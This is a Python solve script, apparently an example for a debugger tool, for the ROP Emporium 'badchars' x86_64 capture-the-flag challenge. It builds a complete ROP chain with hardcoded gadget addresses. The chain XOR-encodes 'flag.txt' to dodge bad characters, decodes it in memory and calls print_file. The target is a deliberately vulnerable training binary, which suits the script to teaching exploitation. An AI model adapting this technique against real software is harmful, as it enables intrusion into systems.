"""ROP Emporium badchars on x86_64: XOR-encoded write + in-place decode.

The string "flag.txt" contains the challenge's bad characters (x, g, a, .).
The qword is XOR-encoded with key 0x02 (all encoded bytes avoid the bad
chars), written to .bss via `mov [r13], r12`, then each byte is decoded
in-place with the `xor r14b, (r15)` gadget. The read buffer (0x200 bytes) is
large enough for all 8 decode blocks.

    ./build/dev/mydbg --headless-script examples/rop_emporium/solve_badchars_x64.py
"""

from __future__ import annotations

import struct

from mydbg import rop, symbolic

import emporium

PAD = 40  # 32-byte buffer + saved rbp
XOR_KEY = 0x02
XOR_GADGET = 0x400628   # xor r14b, (r15); ret
MOV_GADGET = 0x400634   # mov [r13], r12; ret
SHORT_POP = 0x40069c    # pop r12,r13,r14,r15; ret
POP_RDI = 0x4006a3      # pop rdi; ret
PRINT_FILE_PLT = 0x400510
BSS = 0x601038


def run(dbg):
    if not symbolic.requires_angr():
        raise RuntimeError(symbolic.BOOTSTRAP_HINT)
    binary = emporium.challenge_path("x64", "badchars")
    project = symbolic._entry_project(dbg, binary=binary)  # noqa: SLF001
    plt = project.loader.main_object.plt
    print_file_plt = plt["print_file"]

    # "flag.txt" XOR-encoded with key 0x02: all encoded bytes avoid the
    # bad characters (x, g, a, .).
    flag_bytes = b"flag.txt"
    encoded = bytes(b ^ XOR_KEY for b in flag_bytes)
    encoded_qword = struct.unpack("<Q", encoded)[0]
    print(f"[+] encoded qword: {encoded_qword:#x} ({encoded.hex()})")

    # The chain: write the encoded qword, then decode each byte in-place.
    chain = (struct.pack("<Q", SHORT_POP) +      # pop r12,r13,r14,r15
             struct.pack("<Q", encoded_qword) +  # r12 = the encoded qword
             struct.pack("<Q", BSS) +            # r13 = the write target
             struct.pack("<Q", 0) +              # r14 (junk for the mov)
             struct.pack("<Q", 0) +              # r15 (junk for the mov)
             struct.pack("<Q", MOV_GADGET))      # mov [r13], r12
    for i in range(8):
        chain += (struct.pack("<Q", SHORT_POP) +
                  struct.pack("<Q", 0) +         # r12 (junk)
                  struct.pack("<Q", 0) +         # r13 (junk)
                  struct.pack("<Q", XOR_KEY) +   # r14 = the XOR key
                  struct.pack("<Q", BSS + i) +   # r15 = the byte address
                  struct.pack("<Q", XOR_GADGET)) # xor r14b, (r15)
    chain += (struct.pack("<Q", POP_RDI) +
              struct.pack("<Q", BSS) +
              struct.pack("<Q", PRINT_FILE_PLT))

    payload = b"A" * PAD + chain
    print(f"[+] chain: {len(chain)} bytes")

    process = emporium.qemu_connect(dbg, "x64", binary, payload=payload)

    result = dbg.continue_and_wait(timeout=30)
    output = emporium.drain(process, seconds=6.0)
    lines = output.decode(errors="replace").splitlines()
    printed = [line for line in lines if "ROPE{" in line]
    if not printed:
        raise RuntimeError(f"badchars chain failed: {output[-200:]!r}")
    print("[+] badchars-x64-solve-ok:", printed[-1])
